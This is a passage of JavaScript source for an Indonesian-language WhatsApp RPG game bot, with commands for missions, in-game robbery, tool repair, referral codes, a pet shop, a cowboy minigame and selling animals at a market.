            let rokit4 = `🌕🚀

➕ Sukses Mendarat.... 👨‍🚀
`.trim();

            let hsl = `
*—[ Hasil Ngroket ${name} ]—*
➕ 💹 Uang = [ ${ngrk4} ]
➕ ✨ Exp = [ ${ngrk5} ]
➕ 😍 Mendarat Selesai = +1
➕📥Total Mendarat Sebelumnya : ${order}
`.trim();

            user.money += ngrk4;
            user.exp += ngrk5;
            user.rokets += 1;
            user.health -= 80;

            Kilianhst.misi[id] = [
              kerja,
              setTimeout(() => {
                delete Kilianhst.misi[id];
              }, 27000),
            ];

            setTimeout(() => {
              reply(hsl);
            }, 27000);

            setTimeout(() => {
              reply(rokit4);
            }, 25000);

            setTimeout(() => {
              reply(rokit3);
            }, 20000);

            setTimeout(() => {
              reply(rokit2);
            }, 15000);

            setTimeout(() => {
              reply(rokit);
            }, 10000);

            setTimeout(() => {
              reply(`🔍 ${name} Mencari Lokasi.....`);
            }, 0);
            user.lastmisi = new Date() * 1;
          } else
            reply(
              `Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`
            );
        }
        break;

      case "rob":
      case "robery":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let user = db.data.users[m.sender];
          let __timers = new Date() - user.lastmisi;
          let _timers = 3600000 - __timers;
          let timers = clockString(_timers);
          let id = m.sender;
          let kerja = "Rob";
          Kilianhst.misi = Kilianhst.misi ? Kilianhst.misi : {};
          if (id in Kilianhst.misi) {
            reply(`Selesaikan Misi ${Kilianhst.misi[id][0]} Terlebih Dahulu`);
            throw false;
          }
          if (user.health < 80)
            return reply("Anda Harus Memiliki Minimal 80Health");
          if (new Date() - db.data.users[m.sender].lastmisi > 3600000) {
            let rndm1 = Math.floor(Math.random() * 10);
            let rndm2 = Math.floor(Math.random() * 10);

            let ran1 = rndm1 * 100000;
            let ran2 = rndm2 * 1000;

            let jln = `
🏘️🚗

✔️ Mengincar target....
`.trim();

            let jln2 = `
🏘️ 🚶

➕ Memulai aksi....
`.trim();

            let jln3 = `
🏘️

➕ Merampok....
`.trim();

            let jln4 = `
🚗



🏘️🚓

➕ 💹Berhasil kabur....
`.trim();

            let hsl = `
*—[ Hasil rob ]—*

➕ 💹 Uang = [ ${ran1} ]
➕ ✨ Exp = [ ${ran2} ]
➕ 📦 Rob Selesai = +1

Dan health anda berkurang -80
`.trim();
            user.money += ran1;
            user.exp += ran2;
            user.health -= 80;

            Kilianhst.misi[id] = [
              kerja,
              setTimeout(() => {
                delete Kilianhst.misi[id];
              }, 27000),
            ];

            setTimeout(() => {
              reply(hsl);
            }, 27000);

            setTimeout(() => {
              reply(jln4);
            }, 25000);

            setTimeout(() => {
              reply(jln3);
            }, 20000);

            setTimeout(() => {
              reply(jln2);
            }, 15000);

            setTimeout(() => {
              reply(jln);
            }, 10000);

            setTimeout(() => {
              reply("🔍Mencari Rumah.....");
            }, 0);
            user.lastmisi = new Date() * 1;
          } else
            reply(
              `Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`
            );
        }
        break;

      case "repair":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          const { default: MessageType } = require("@adiwajshing/baileys");

          let type = (args[0] || "").toLowerCase();
          let _type = (args[0] || "").toLowerCase();
          let user = db.data.users[m.sender];
          db.data.users[m.sender].pickaxe =
            db.data.users[m.sender].pickaxe || 0;
          db.data.users[m.sender].sword = db.data.users[m.sender].sword || 0;
          db.data.users[m.sender].fishingrod =
            db.data.users[m.sender].fishingrod || 0;
          db.data.users[m.sender].armor = db.data.users[m.sender].armor || 0;
          let botol = global.botwm;

          let lgocraft = `
*「 R E P A I R」*`;

          let caption = `
*乂 .repaire pickaxe ⛏️
*乂 .repair sword ⚔️
*乂 .repair fishingrod 🎣
*乂 .repair armor 🥼

*❏ RECIPE*
*乂 Pickaxe ⛏️
〉20 Rock
〉 20 Wood
〉 20 Iron
〉 1 Diamond

*乂 Sword ⚔️
〉 20 Wood
〉 20 Iron
〉 2 Gold
〉 1 Diamond

*乂 FishingRod ⚔️
〉 20 Wood
〉 20 String
〉 20 Iron
〉 1 Diamond

*乂 Armor 🥼
〉 15 Iron
〉 2 Gold
〉 1 Diamond
`;

          try {
            if (/repair/i.test(command)) {
              const count =
                args[1] && args[1].length > 0
                  ? Math.min(99999999, Math.max(parseInt(args[1]), 1))
                  : !args[1] || args.length < 3
                  ? 1
                  : Math.min(1, count);
              switch (type) {
                case "pickaxe":
                  if (user.pickaxedurability > 99)
                    return reply("Tools ini belum memiliki kerusakan");
                  if (user.pickaxe == 0) return reply("Kamu belum memilik ini");
                  if (
                    user.diamond < 1 ||
                    user.rock < 20 ||
                    user.wood < 20 ||
                    user.iron < 20
                  )
                    return reply(`Barang tidak cukup!`);
                  user.rock -= 20;
                  user.wood -= 20;
                  user.iron -= 20;
                  user.diamond -= 1;
                  user.pickaxedurability = 100;
                  reply("Sukses memperbaiki!");
                  break;

                case "":
                  break;

                default:
                  return Kilianhst.sendButton(
                    m.chat,
                    caption,
                    wm,
                    null,
                    [`⋮☰ Menu`, `.menu`],
                    m
                  );
              }
            }
          } catch (err) {
            reply("Error\n\n\n" + err.stack);
          }
        }
        break;

      case "referal":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk Memulai Rpg Game Ketik .joinrpg Dan Untuk Keluar Game Ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);

          const { randomInt } = require("crypto");
          const xp_first_time = 2500;
          const xp_link_creator = 15000;
          const xp_bonus = {
            5: 40000,
            10: 100000,
            20: 250000,
            50: 1000000,
            100: 10000000,
          };

          let users = db.data.users;

          if (text) {
            if ("ref_count" in users[m.sender])
              return reply("Kamu Sudah Pernah Memakai Kode Referal!");
            let link_creator = (Object.entries(users).find(
              ([, { ref_code }]) => ref_code === text.trim()
            ) || [])[0];
            if (!link_creator) return reply("Kode Referal Tidak Valid!");
            let count = users[link_creator].ref_count++;
            let extra = xp_bonus[count] || 0;
            users[link_creator].exp += xp_link_creator + extra;
            users[m.sender].exp += xp_first_time;
            users[m.sender].ref_count = 0;
            reply(`Selamat! Kamu Mendapatkan +${xp_first_time} XP`);
            Kilianhst.sendMessage(link_creator, {
              text: `Seseorang Telah Menggunakan Kode Referal Kamu\n+${
                xp_link_creator + extra
              } XP`,
            });
          } else {
            let code = (users[m.sender].ref_code =
              users[m.sender].ref_code ||
              new Array(11)
                .fill()
                .map(
                  () =>
                    [
                      ..."0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
                    ][randomInt(62)]
                )
                .join(""));
            users[m.sender].ref_count = users[m.sender].ref_count || 0;
            let command_text = `${command}ref ${code}`;
            let custom_message = `Halo! Coba RPG Bot Ini Yuk!\nGunakan Kode Referal Aku: *${code}*\n\nKetik Di Chat Bot:\n${command_text}`;
            let share_link = `https://wa.me/?text=${encodeURIComponent(
              custom_message
            )}`;

            reply(`Dapatkan ${xp_link_creator} XP Untuk Setiap Pengguna Baru Yang Menggunakan Kode Referal Kamu
${users[m.sender].ref_count} Orang Telah Menggunakan Kode Referal Kamu

Kode Referal Kamu: *${code}*

Bagikan Link Ini Ke Teman:\n${share_link}

${Object.entries(xp_bonus)
  .map(([count, xp]) => `${count} Orang = Bonus ${xp} XP`)
  .join("\n")}`);
          }
        }
        break;

      case "petstore":
      case "petshop":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          let type = (args[0] || "").toLowerCase();
          let _type = (args[0] || "").toLowerCase();
          let user = db.data.users[m.sender];
          db.data.users[m.sender].pickaxe =
            db.data.users[m.sender].pickaxe || 0;
          db.data.users[m.sender].pedang = db.data.users[m.sender].pedang || 0;
          db.data.users[m.sender].fishingrod =
            db.data.users[m.sender].fishingrod || 0;

          //----------HARGA
          let hdog = 2;
          let hcat = 2;
          let hhorse = 4;
          let hfox = 6;
          let hrobo = 10;

          let hlion = 10;
          let hrhinoceros = 10;
          let hdragon = 10;
          let hcentaur = 10;
          let hkyubi = 10;
          let hgriffin = 10;
          let hphonix = 10;
          let hwolf = 10;

          let logo = `— *P E T S T O R E* —
▮▧▧▧▧▧▧▧▧▧▧▧▧▮`;
          let caption = `
🐈 *Cat:* ${hcat} 🔖
🐕 *Dog:* ${hdog} 🔖
🐎 *Horse:* ${hhorse} 🔖
🦊 *Fox:* ${hfox} 🔖
🤖 *Robo:* ${hrobo} 🔖

〉 Ingin Beli? Check out:
.petshop cat
.petshop fox
.petshop dog
and more! 🐾
`;

          try {
            if (/petshop/i.test(command)) {
              const count =
                args[1] && args[1].length > 0
                  ? Math.min(99999999, Math.max(parseInt(args[1]), 1))
                  : !args[1] || args.length < 3
                  ? 1
                  : Math.min(1, count);
              switch (type) {
                case "cat":
                  if (user.cat > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hcat) return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hcat;
                  db.data.users[m.sender].cat += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "dog":
                  if (user.dog > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hdog) return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hdog;
                  db.data.users[m.sender].dog += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "fox":
                  if (user.fox > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hfox) return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hfox;
                  db.data.users[m.sender].fox += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "horse":
                  if (user.horse > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hhorse) return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hhorse;
                  db.data.users[m.sender].horse += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "robo":
                  if (user.robo > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hrobo) return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hrobo;
                  db.data.users[m.sender].robo += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "lion":
                  if (user.lion > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hlion) return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hlion;
                  db.data.users[m.sender].lion += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "rhinoceros":
                  if (user.rhinoceros > 0)
                    return reply("Kamu sudah memilik ini");
                  if (user.pet < hrhinoceros)
                    return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hrhinoceros;
                  db.data.users[m.sender].rhinoceros += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "dragon":
                  if (user.dragon > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hdragon) return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hdragon;
                  db.data.users[m.sender].dragon += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "centaur":
                  if (user.centaur > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hcentaur)
                    return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hcentaur;
                  db.data.users[m.sender].centaur += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "kyubi":
                  if (user.kyubi > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hkyubi) return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hkyubi;
                  db.data.users[m.sender].kyubi += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "griffin":
                  if (user.griffin > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hgriffin)
                    return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hgriffin;
                  db.data.users[m.sender].griffin += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "phonix":
                  if (user.phonix > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hphonix) return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hphonix;
                  db.data.users[m.sender].phonix += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                case "wolf":
                  if (user.wolf > 0) return reply("Kamu sudah memilik ini");
                  if (user.pet < hwolf) return reply(`Pet Token anda kurang`);
                  db.data.users[m.sender].pet -= hwolf;
                  db.data.users[m.sender].wolf += 1;
                  reply("Selamat anda mempunyai pet Baru ! 🎉");
                  break;

                default:
                  return await reply(`${logo}\n${caption}`);
              }
            } else if (/enchant|enchan/i.test(command)) {
              const count =
                args[2] && args[2].length > 0
                  ? Math.min(99999999, Math.max(parseInt(args[2]), 1))
                  : !args[2] || args.length < 4
                  ? 1
                  : Math.min(1, count);
              switch (_type) {
                case "t":
                  break;

                case "":
                  break;

                default:
                  return reply(`${logo}\n${caption}`);
              }
            }
          } catch (err) {
            reply("Error\n\n\n" + err.stack);
          }
        }
        break;

      case "kolam":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          let user = db.data.users[m.sender];
          let past = `
╭━━━━「 *BIO* 」 
┊ *💌 Name :* ${user.registered ? user.name : Kilianhst.getName(m.sender)}
┊ *📊 Level :* ${user.level}
┊ *✨ Exp :* ${user.exp}
╰═┅═━––––––─ׄ✧

╭━━━━「 *ISI* 」
┊🦀 Kepiting: ${user.kepiting}
┊🦞 Lobster: ${user.lobster}
┊🦐 Udang: ${user.udang}
┊🦑 Cumi: ${user.cumi}
┊🐙 Gurita: ${user.gurita}
┊🐡 Buntal: ${user.buntal}
┊🐠 Dory: ${user.dory}
┊🐳 Orca: ${user.orca}
┊🐬 Lumba: ${user.lumba}
┊🐋 Paus: ${user.paus}
┊🦈 Hiu: ${user.hiu}
╰═┅═━––––––─ׄ✧
🎏 Total Isi: *${
            user.kepiting +
            user.lobster +
            user.udang +
            user.cumi +
            user.gurita +
            user.buntal +
            user.dory +
            user.orca +
            user.lumba +
            user.paus +
            user.hiu
          }* Jenis`;
          reply(past);
        }
        break;

      case "koboy":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk Memulai Ketik .joinrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function random(arr) {
            return arr[Math.floor(Math.random() * arr.length)];
          }
          try {
            Kilianhst.tembak = Kilianhst.tembak || { musuh: [], tembak: [] };
            if (/kiri/i.test(text)) {
              let kiri = [
                ["🤠", "-", "-", "-", "-"],
                ["-", "🤠", "-", "-", "-"],
                ["-", "-", "🤠", "-", "-"],
                ["-", "-", "-", "🤠", "-"],
                ["-", "-", "-", "-", "🤠"],
              ];
              let posisi = Kilianhst.tembak.tembak.indexOf("🤠");
              if (posisi == 0 || posisi == 1) Kilianhst.tembak.tembak = kiri[0];
              else if (posisi == 2) Kilianhst.tembak.tembak = kiri[1];
              else if (posisi == 3) Kilianhst.tembak.tembak = kiri[2];
              else if (posisi == 4) Kilianhst.tembak.tembak = kiri[3];
              let pos =
                Kilianhst.tembak.musuh.join(" ") +
                "\n\n\n" +
                Kilianhst.tembak.tembak.join(" ");
              return reply(pos);
            } else if (/kanan/i.test(text)) {
              let kanan = [
                ["🤠", "-", "-", "-", "-"],
                ["-", "🤠", "-", "-", "-"],
                ["-", "-", "🤠", "-", "-"],
                ["-", "-", "-", "🤠", "-"],
                ["-", "-", "-", "-", "🤠"],
              ];
              let posisi = Kilianhst.tembak.tembak.indexOf("🤠");
              if (posisi == 0) Kilianhst.tembak.tembak = kanan[1];
              else if (posisi == 1) Kilianhst.tembak.tembak = kanan[2];
              else if (posisi == 2) Kilianhst.tembak.tembak = kanan[3];
              else if (posisi == 3 || posisi == 4)
                Kilianhst.tembak.tembak = kanan[4];
              let pos =
                Kilianhst.tembak.musuh.join(" ") +
                "\n\n\n" +
                Kilianhst.tembak.tembak.join(" ");
              return reply(pos);
            } else if (/tembak/i.test(text)) {
              if (
                Kilianhst.tembak.tembak.indexOf("🤠") ==
                Kilianhst.tembak.musuh.indexOf("🥷")
              ) {
                Kilianhst.tembak = {};
                db.data.users[m.sender].money += 1000;
                return reply("Kamu Menang!\n\nUang += 1000");
              } else {
                return reply("Tembakanmu Meleset!");
              }
            } else {
              let randMusuh = [
                ["🥷", "-", "-", "-", "-"],
                ["-", "🥷", "-", "-", "-"],
                ["-", "-", "🥷", "-", "-"],
                ["-", "-", "-", "🥷", "-"],
                ["-", "-", "-", "-", "🥷"],
              ];
              let randAku = [
                ["🤠", "-", "-", "-", "-"],
                ["-", "🤠", "-", "-", "-"],
                ["-", "-", "🤠", "-", "-"],
                ["-", "-", "-", "🤠", "-"],
                ["-", "-", "-", "-", "🤠"],
              ];
              let musuh = random(randMusuh);
              let aku = random(randAku);
              Kilianhst.tembak.musuh = musuh;
              Kilianhst.tembak.tembak = aku;
              let pos = musuh.join(" ") + "\n\n\n" + aku.join(" ");
              return reply(pos);
            }
          } catch (err) {
            console.log("Error Game Koboy:", err);
            reply("Terjadi Kesalahan Saat Menjalankan Game.");
          }
        }
        break;

      case "pasar":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          const Skepiting = 7000;
          const Slobster = 7000;
          const Sudang = 7000;
          const Scumi = 7000;
          const Sgurita = 7000;
          const Sbuntal = 7000;
          const Sdory = 7000;
          const Sorca = 7000;
          const Slumba = 7000;
          const Spaus = 7000;
          const Sikan = 7000;
          const Shiu = 7000;
          const Sbanteng = 9000;
          const Sharimau = 9000;
          const Sgajah = 9000;
          const Skambing = 9000;
          const Spanda = 9000;
          const Sbuaya = 9000;
          const Skerbau = 9000;
          const Ssapi = 9000;
          const Smonyet = 9000;
          const Sbabihutan = 9000;
          const Sbabi = 9000;
          const Sayam = 9000;
          const Sbotol = 100;
          const Skardus = 100;
          const Skaleng = 100;
          const Sgelas = 100;
          const Splastik = 100;

          const _armor = db.data.users[m.sender].armor;
          const armor =
            _armor == 0
              ? 20000
              : "" || _armor == 1
              ? 49999
              : "" || _armor == 2
              ? 99999
              : "" || _armor == 3
              ? 149999
              : "" || _armor == 4
              ? 299999
              : "";
          let type = (args[0] || "").toLowerCase();
          let _type = (args[1] || "").toLowerCase();
          let jualbeli = (args[0] || "").toLowerCase();
          const Kchat = `╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Hewan Laut | 💲 Harga Jual*\n═┅═━––––––━––––––๑
🦀 Kepiting: ${Skepiting}
🦞 Lobster: ${Slobster}
🦐 Udang: ${Sudang}
🦑 Cumi: ${Scumi}
🐙 Gurita: ${Sgurita}
🐡 Buntal: ${Sbuntal}
🐠 Dory: ${Sdory}
🐳 Orca: ${Sorca}
🐬 Lumba: ${Slumba}
🐋 Paus: ${Spaus}
🦈 Hiu: ${Shiu}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Hewan Darat | 💲 Harga Jual*\n═┅═━––––––━––––––๑
🐃 Banteng: ${Sbanteng}
🐅 Harimau: ${Sharimau}
🐘 Gajah: ${Sgajah}
🐐 Kambing: ${Skambing}
🐼 Panda: ${Spanda}
🐃 Kerbau: ${Skerbau}
🐊 Buaya: ${Sbuaya}
🐂 Sapi: ${Ssapi}
🐒 Monyet: ${Smonyet}
🐗 Babi Hutan: ${Sbabihutan}
🐖 Babi: ${Sbabi}
🐔 Ayam: ${Sayam}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
📌 *Contoh penggunaan :*\n═┅═━––––––━––––––๑
#pasar jual ayam [Jumlah]
`.trim();
          try {
            if (/pasar|toko/i.test(command)) {
              const count =
                args[2] && args[2].length > 0
                  ? Math.min(99999999, Math.max(parseInt(args[2]), 1))
                  : !args[2] || args.length < 4
                  ? 1
                  : Math.min(1, count);
              const sampah = db.data.users[m.sender].sampah;
              switch (jualbeli) {
                case "jual":
                  switch (_type) {
                    case "banteng":
                      if (db.data.users[m.sender].banteng >= count * 1) {
                        db.data.users[m.sender].money += Spaus * count;
                        db.data.users[m.sender].banteng -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Banteng Dengan Harga ${
                            Sbanteng * count
                          } Money `.trim()
                        );
                      } else reply(`Banteng Kamu Tidak Cukup`.trim());
                      break;

                    case "harimau":
                      if (db.data.users[m.sender].harimau >= count * 1) {
                        db.data.users[m.sender].money += Sharimau * count;
                        db.data.users[m.sender].harimau -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Harimau Dengan Harga ${
                            Sharimau * count
                          } Money `.trim()
                        );
                      } else reply(`Harimau Kamu Tidak Cukup`.trim());
                      break;

                    case "gajah":
                      if (db.data.users[m.sender].gajah >= count * 1) {
                        db.data.users[m.sender].money += Sgajah * count;
                        db.data.users[m.sender].gajah -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Gajah Dengan Harga ${
                            Sgajah * count
                          } Money `.trim()
                        );
                      } else reply(`Gajah Kamu Tidak Cukup`.trim());
                      break;

                    case "kambing":
                      if (db.data.users[m.sender].kambing >= count * 1) {
                        db.data.users[m.sender].money += Skambing * count;
                        db.data.users[m.sender].kambing -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Kambing Dengan Harga ${
                            Skambing * count
                          } Money `.trim()
                        );
                      } else reply(`Kambing Kamu Tidak Cukup`.trim());
                      break;

                    case "panda":
                      if (db.data.users[m.sender].panda >= count * 1) {
                        db.data.users[m.sender].money += Spanda * count;
                        db.data.users[m.sender].panda -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Panda Dengan Harga ${
                            Sbuaya * count
                          } Money `.trim()
                        );
                      } else reply(`Panda Kamu Tidak Cukup`.trim());
                      break;

                    case "buaya":
                      if (db.data.users[m.sender].buaya >= count * 1) {
                        db.data.users[m.sender].money += Sbuaya * count;
                        db.data.users[m.sender].buaya -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Buaya Dengan Harga ${
                            Sbuaya * count
                          } Money `.trim()
                        );
                      } else reply(`Buaya Kamu Tidak Cukup`.trim());
                      break;

                    case "kerbau":
                      if (db.data.users[m.sender].kerbau >= count * 1) {
                        db.data.users[m.sender].money += Skerbau * count;
                        db.data.users[m.sender].kerbau -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Kerbau Dengan Harga ${
                            Skerbau * count
                          } Money `.trim()
                        );
                      } else reply(`Kerbau Kamu Tidak Cukup`.trim());
                      break;

                    case "sapi":
                      if (db.data.users[m.sender].sapi >= count * 1) {
                        db.data.users[m.sender].money += Ssapi * count;
                        db.data.users[m.sender].sapi -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Sapi Dengan Harga ${
                            Ssapi * count
                          } Money `.trim()
                        );
                      } else reply(`Sapi Kamu Tidak Cukup`.trim());
                      break;

                    case "monyet":
                      if (db.data.users[m.sender].monyet >= count * 1) {
                        db.data.users[m.sender].money += Smonyet * count;
                        db.data.users[m.sender].monyet -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Monyet Dengan Harga ${
                            Smonyet * count
                          } Money `.trim()
                        );
                      } else reply(`Monyet Kamu Tidak Cukup`.trim());
                      break;

                    case "babi":
                      if (db.data.users[m.sender].babi >= count * 1) {
                        db.data.users[m.sender].money += Skepiting * count;
                        db.data.users[m.sender].babi -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Babi Dengan Harga ${
                            Sbabi * count
                          } Money `.trim()
                        );
                      } else reply(`Babi Kamu Tidak Cukup`.trim());
                      break;

                    case "babihutan":
                      if (db.data.users[m.sender].babihutan >= count * 1) {
                        db.data.users[m.sender].money += Sbabihutan * count;
                        db.data.users[m.sender].babihutan -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Babi Hutan Dengan Harga ${
                            Sbabihutan * count
                          } Money `.trim()
                        );
                      } else reply(`Babi Hutan Kamu Tidak Cukup`.trim());
                      break;

                    case "ayam":
                      if (db.data.users[m.sender].ayam >= count * 1) {
                        db.data.users[m.sender].money += Sayam * count;
                        db.data.users[m.sender].ayam -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Ayam Dengan Harga ${
                            Sayam * count
                          } Money `.trim()
                        );
                      } else reply(`Ayam Kamu Tidak Cukup`.trim());
                      break;
                    //mancing
                    case "kepiting":
                      if (db.data.users[m.sender].kepiting >= count * 1) {
                        db.data.users[m.sender].money += Skepiting * count;
                        db.data.users[m.sender].kepiting -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Kepiting Dengan Harga ${
                            Skepiting * count
                          } Money `.trim()
                        );
                      } else reply(`Kepiting Kamu Tidak Cukup`.trim());
                      break;

                    case "ikan":
                      if (db.data.users[m.sender].ikan >= count * 1) {
                        db.data.users[m.sender].money += Skepiting * count;
                        db.data.users[m.sender].ikan -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Ikan Dengan Harga ${
                            Sikan * count
                          } Money `.trim()
                        );
                      } else reply(`Ikan Kamu Tidak Cukup`.trim());
                      break;

                    case "dory":
                      if (db.data.users[m.sender].dory >= count * 1) {
                        db.data.users[m.sender].money += Sdory * count;
                        db.data.users[m.sender].dory -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Ikan Dory Dengan Harga ${
                            Sdory * count
                          } Money `.trim()
                        );
                      } else reply(`Ikan Dory Kamu Tidak Cukup`.trim());
                      break;

                    case "gurita":
                      if (db.data.users[m.sender].gurita >= count * 1) {
                        db.data.users[m.sender].money += Skepiting * count;
                        db.data.users[m.sender].gurita -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Gurita Dengan Harga ${
                            Sgurita * count
                          } Money `.trim()
                        );
                      } else reply(`Gurita Kamu Tidak Cukup`.trim());
                      break;

                    case "buntal":
                      if (db.data.users[m.sender].buntal >= count * 1) {
                        db.data.users[m.sender].money += Sbuntal * count;
                        db.data.users[m.sender].buntal -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${
                            Sbuntal * count
                          } Money `.trim()
                        );
                      } else reply(`Ikan Buntal Kamu Tidak Cukup`.trim());
                      break;

                    case "hiu":
                      if (db.data.users[m.sender].hiu >= count * 1) {
                        db.data.users[m.sender].money += Shiu * count;
                        db.data.users[m.sender].hiu -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Hiu Dengan Harga ${
                            Shiu * count
                          } Money `.trim()
                        );
                      } else reply(`Hiu Kamu Tidak Cukup`.trim());
                      break;

                    case "orca":
                      if (db.data.users[m.sender].orca >= count * 1) {
                        db.data.users[m.sender].money += Sorca * count;
                        db.data.users[m.sender].orca -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Paus Orca Dengan Harga ${
                            Sorca * count
                          } Money `.trim()
                        );
                      } else reply(`Paus Orca Kamu Tidak Cukup`.trim());
                      break;

                    case "lumba":
                      if (db.data.users[m.sender].lumba >= count * 1) {
                        db.data.users[m.sender].money += Skepiting * count;
                        db.data.users[m.sender].lumba -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${
                            Slumba * count
                          } Money `.trim()
                        );
                      } else reply(`Lumba Lumba Kamu Tidak Cukup`.trim());
                      break;

                    case "paus":
                      if (db.data.users[m.sender].paus >= count * 1) {
                        db.data.users[m.sender].money += Spaus * count;
                        db.data.users[m.sender].paus -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Paus Dengan Harga ${
                            Spaus * count
                          } Money `.trim()
                        );
                      } else reply(`Paus Kamu Tidak Cukup`.trim());
                      break;

                    case "lobster":
                      if (db.data.users[m.sender].lobster >= count * 1) {
                        db.data.users[m.sender].money += Slobster * count;
                        db.data.users[m.sender].lobster -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Lobster Dengan Harga ${
                            Slobster * count
                          } Money `.trim()
                        );
                      } else reply(`Lobster Kamu Tidak Cukup`.trim());
                      break;
                    case "udang":
                      if (db.data.users[m.sender].udang >= count * 1) {
                        db.data.users[m.sender].money += Sudang * count;
                        db.data.users[m.sender].udang -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Udang Dengan Harga ${
                            Sudang * count
                          } Money `.trim()
                        );
                      } else reply(`Udang Kamu Tidak Cukup`.trim());
                      break;

                    case "cumi":
                      if (db.data.users[m.sender].cumi >= count * 1) {
                        db.data.users[m.sender].money += Scumi * count;
                        db.data.users[m.sender].cumi -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Cumi Dengan Harga ${
                            Scumi * count
                          } Money `.trim()
                        );
